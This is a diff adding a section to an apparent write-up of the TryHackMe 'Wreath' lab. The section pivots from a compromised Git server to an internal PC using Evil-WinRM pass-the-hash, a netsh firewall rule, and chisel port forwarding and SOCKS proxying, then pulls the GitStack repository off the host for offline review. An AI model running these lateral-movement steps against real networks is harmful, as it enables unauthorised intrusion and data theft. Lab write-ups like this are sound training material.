@@ -641,6 +641,79 @@ We use evil-winRM and the Adminstrator hash we already have, upload the file to 
 
 ## Personal PC Pivoting
 
+We have two immediate options for this: Chisel, and Plink.
+
+First of all we upload chisel.exe binary to the Git Server (.150) through Evil-WinRM upload feature.
+
+Secondly, we have to open up one port in the git server machine by adding a firewall rule so that, firewall doesn’t block our connection.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+# dir=in which means the direction of packets will be coming in to this machine and action=allow which says to allow the packets. Finally localport=30000 opens up port 30000 for this
+netsh advfirewall firewall add rule name="chisel_dking" dir=in action=allow protocol=tcp localport=30000
+```
+{% endcode %}
+
+#### Method 1 - Port Forward
+
+`.\chisel_dking server -p 30000` - on the Git server.
+
+`./chisel client 10.200.87.150:30000 9020:10.200.87.100:80` - on our kali (this forward all the traffic from our `kali localhost:9020` to the Target Machine (personal pc) `10.200.57.100:80` using the (Git Server) `10.200.57.150:30000` in the middle).
+
+<figure><img src=".gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+
+Now we can access the Prsonal PC port 80 easily by going to `127.0.0.1:9020` - from our browser.
+
+<figure><img src=".gitbook/assets/image (110).png" alt=""><figcaption><p>success</p></figcaption></figure>
+
+Another way to do this with chisel is:
+
+#### Method 2 - Forward proxy
+
+<figure><img src=".gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
+
+This will establish the connection to the chisel server. The communication is done via the `9090` socks proxy. But for this we have to use Foxyproxy to access the site:
+
+<figure><img src=".gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
+
+Ok, so we have access to the Personal PC web server now.
+
+## The Wonders of Git
+
+### Git Files <a href="#git-files" id="git-files"></a>
+
+The website itself appears to be an exact copy of the website running on the `10.200.85.200` server. To discover any differences, we would have to do some fuzzing which is very tedious through two proxies.
+
+So we need another idea. The hint on the Wreath task description summarizes the attack vector pretty well:
+
+“We know from the brief that Thomas has been using git server to version control his projects – just because the version on the webserver isn’t up to date, doesn’t mean that he hasn’t been committing to the repo more regularly! In other words, rather than fuzzing the server, we might be able to just download the source code for the site and review it locally. Ideally we could just clone the repo directly from the server. This would likely require credentials, which we would need to find. Alternatively, given we already have local admin access to the git server, we could just download the repository from the hard disk and re-assemble it locally which does not require any (further) authentication.” (https://tryhackme.com/room/wreath)
+
+So let’s do that. We use the `evil-rm` login (pass the hash) and search for git files.
+
+We navigate to the `C:\` dir and found a "GitStack" dir.
+
+In the directory `C:\GitStack\repositories` we find a file called `Website.git`.  Let's download and analyze it locally on our kali machine. (Note: for the download, the absolute path has to be specified).
+
+`download C:\GitStack\repositories\website.git`&#x20;
+
+Once downloaded, we rename it to: `mv website.git .git` then run "git log" on it, to see all previous commits.
+
+<figure><img src=".gitbook/assets/image (115).png" alt=""><figcaption><p>extract everything to the "website_extracted" folder.</p></figcaption></figure>
+
+{% hint style="warning" %}
+Git repositories always contain a special directory called .git which contains all of the meta-information for the repository. This directory can be used to fully recreate a readable copy of the repository, including things like version control and branches. If the repository is local then this directory would be a part of the full repository — the rest of which would be the items of the repository in a human-readable format; however, as the .git directory is enough to recreate the repository in its entirety, the server doesn’t need to store the easily readable versions of the files. This means that what we’ve downloaded isn’t actually the full repository, so much as the building blocks we can use to recreate the repo.
+
+To analyze this .git directory we use a tool named "GitTools" which is available on the following link:
+
+> git clone [https://github.com/internetwache/GitTools](https://github.com/internetwache/GitTools)
+
+We use it to extract information for the downloaded git directory.
+{% endhint %}
+
+
+
 
 
 
